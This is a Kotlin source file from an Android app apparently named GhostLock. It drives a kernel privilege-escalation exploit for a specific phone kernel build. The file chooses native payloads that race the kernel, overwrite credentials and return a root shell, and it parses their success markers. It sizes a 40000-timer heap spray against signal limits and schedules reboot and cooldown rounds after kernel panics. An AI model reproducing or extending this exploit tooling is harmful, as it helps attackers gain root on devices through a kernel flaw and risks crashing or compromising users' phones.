package com.ghostlock.app.data.payload

/**
 * CVE-2026-64560 payload bridge.
 *
 * The Find N5 release `6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k` ships the
 * rtmutex fix for CVE-2026-43499, so no in-process pipeline can run there: the
 * extractor gate reports `already_fixed`. The 64560 primitive on that build
 * lives in a self-contained payload that performs its own race, controlled
 * write and credential patch.
 *
 * GhostLock owns only the decisions around it: which payload an invocation
 * uses, whether the run can possibly succeed on this process, when the round
 * stops, and how a payload line maps to an outcome. The payload owns the
 * kernel primitive; GhostLock must never claim a write it did not verify.
 *
 * One invocation is one payload process on the current boot. The validated
 * recipe (device gate 2026-10-22, Find N5 `gc4127a25dcf3`) started every
 * attempt on a freshly booted kernel: round 1 missed, round 2 panicked the
 * kernel, round 3 held a root child. A miss leaves the sprayed slab state
 * dirty, so the caller re-invokes after the reboot instead of looping here.
 */
object PayloadBridge {
    /** Kernel release fragment of the only build this bridge is validated for. */
    const val FindN5KernelMarker = "gc4127a25dcf3"

    /** Timer fan-out variant; the one that reached a hold on the device gate. */
    const val FanoutPayload = "libn5fanout.so"

    /** Timer slot rotation variant. */
    const val RotatePayload = "libn5rotate.so"

    /** Payload reached an interactive root child; this is the only success marker. */
    const val HoldMarker = "ROOT_CHILD_HOLD_PASS"

    /** Payload refused this device; another invocation cannot change that. */
    const val RejectMarker = "TARGET_PROFILE_GATE_FAIL"

    /** Payload self-check passed without touching the kernel. */
    const val PreflightMarker = "PREFLIGHT_PASS"

    /**
     * Timer count the validated payload build bakes in.
     *
     * `timer_create()` charges `sigqueue_alloc()` against `RLIMIT_SIGPENDING`
     * per uid, so this number must fit under the shell uid's `Max pending
     * signals` ceiling. A build asking for more than the ceiling fills the
     * spray only partially, reclaim never lines up, and every attempt ends in
     * `BOOTID_WRITE_MISS`. The 55478 build was unrunnable for exactly this
     * reason; the 40000 build fits under the 41381 ceiling.
     */
    const val TimerGoal = 40000

    /** How one payload invocation ended. */
    enum class Outcome {
        /** Root child is live. */
        Hold,

        /** Payload gate rejected this device; stop the whole run. */
        Rejected,

        /** Payload exited without a hold. */
        Exited,

        /** Budget spent with the payload still running and silent. */
        Stalled,
    }

    /**
     * 一轮的预算与热度门槛, 加上 host 侧的调度参数。
     *
     * 调度参数 (rounds / coolTimeout / fastAfterCrash ...) 只被 app 的轮次驱动读取, native
     * 与 UserService 都看不到; 每轮真正下传给 UserService 的只有 [budgetSeconds] /
     * [stallSeconds] / [gateMilliCelsius]。
     */
    data class Plan(
        val budgetSeconds: Int = 900,
        val stallSeconds: Int = 20,
        val gateMilliCelsius: Int = 58000,
        val panicMilliCelsius: Int = 75000,
        val rounds: Int = 25,
        val coolTimeoutSeconds: Int = 300,
        val quietSeconds: Int = 20,
        val fastQuietSeconds: Int = 5,
        val fastAfterCrash: Int = 8,
        val rebootEachRound: Boolean = true,
        val pollSeconds: Int = 5,
        /* 平台期放行: 90 s 窗口内降幅不足 2 C 且当前不超过门限 + 2 C 时也放行。热平衡点常常
         * 停在门限上方, 死等只会把每轮的 coolTimeout 烧光。 */
        val plateauWindowSeconds: Int = 90,
        val plateauDeltaMilliCelsius: Int = 2000,
        val plateauMarginMilliCelsius: Int = 2000,
        /* 连续崩溃后的重置温度: 连续崩说明喷堆把 slab 弄脏了, 只靠换 boot 不够。 */
        val rebootCoolMilliCelsius: Int = 78000,
        val crashStreakForFullReset: Int = 2,
    ) {
        init {
            require(budgetSeconds > 0) { "budgetSeconds must be positive" }
            require(stallSeconds > 0) { "stallSeconds must be positive" }
            require(gateMilliCelsius > 0) { "gateMilliCelsius must be positive" }
            require(panicMilliCelsius > gateMilliCelsius) {
                "panic gate must sit above the fire gate"
            }
            require(rounds > 0) { "rounds must be positive" }
            require(coolTimeoutSeconds > 0) { "coolTimeoutSeconds must be positive" }
            require(fastAfterCrash >= 0) { "fastAfterCrash must not be negative" }
            require(quietSeconds >= 0 && fastQuietSeconds >= 0) {
                "quiet seconds must not be negative"
            }
            require(pollSeconds > 0) { "pollSeconds must be positive" }
            require(plateauWindowSeconds > 0) { "plateauWindowSeconds must be positive" }
            require(plateauDeltaMilliCelsius > 0 && plateauMarginMilliCelsius > 0) {
                "plateau thresholds must be positive"
            }
            require(rebootCoolMilliCelsius > 0) { "rebootCoolMilliCelsius must be positive" }
            require(crashStreakForFullReset > 0) { "crashStreakForFullReset must be positive" }
        }
    }

    /** True when [release] is the build this bridge was validated on. */
    fun isFindN5Kernel(release: String): Boolean = release.contains(FindN5KernelMarker)


    /**
     * KernelSU KMI for [release] (`android15-6.6` for `6.6.118-android15-8-...`).
     *
     * `ksud late-load --kmi` is how the native handoff already loads the module, so the payload
     * path reuses it instead of shipping a `kernelsu.ko`. Null when the release does not carry
     * both an `androidNN` tag and a `major.minor` prefix.
     */
    fun kmiFor(release: String): String? {
        val android = AndroidTagPattern.find(release)?.groupValues?.getOrNull(1) ?: return null
        val version = release.split('-').firstOrNull { KernelVersionPattern.matches(it) } ?: return null
        val majorMinor = version.split('.').take(2).joinToString(".")
        return "android$android-$majorMinor"
    }

    private val AndroidTagPattern = Regex("android(\\d+)")
    private val KernelVersionPattern = Regex("\\d+\\.\\d+.*")
    /**
     * Payload for one invocation. The choice is explicit and comes from the
     * caller; it is never inferred from kernel metadata.
     */
    fun payloadFor(rotate: Boolean): String = if (rotate) RotatePayload else FanoutPayload

    /** Terminal outcome carried by [line], or null for a plain progress line. */
    fun classify(line: String): Outcome? = when {
        line.contains(HoldMarker) -> Outcome.Hold
        line.contains(RejectMarker) -> Outcome.Rejected
        else -> null
    }

    /** True when the round must stop immediately instead of burning its budget. */
    fun isTerminal(outcome: Outcome?): Boolean =
        outcome == Outcome.Hold || outcome == Outcome.Rejected

    /**
     * Soft `Max pending signals` limit from `/proc/self/limits`, or 0 when the
     * line is missing. The payload child inherits these limits from this
     * process, which is why the check reads them here and not inside the
     * payload.
     */
    fun maxPendingSignals(limits: String): Int {
        val line = limits.lineSequence()
            .firstOrNull { it.trimStart().startsWith("Max pending signals") }
            ?: return 0
        return line.trim().split(Regex("\\s+"))
            .firstOrNull { token -> token.isNotEmpty() && token.all(Char::isDigit) }
            ?.toIntOrNull()
            ?: 0
    }

    /**
     * True when the spray can reach [TimerGoal] on this process. Unreadable
     * limits fail the gate: a run that cannot fill the spray burns the boot for
     * nothing, and the caller has no way to tell that from a genuine miss.
     */
    fun timerBudgetFits(limits: String): Boolean = maxPendingSignals(limits) >= TimerGoal
}
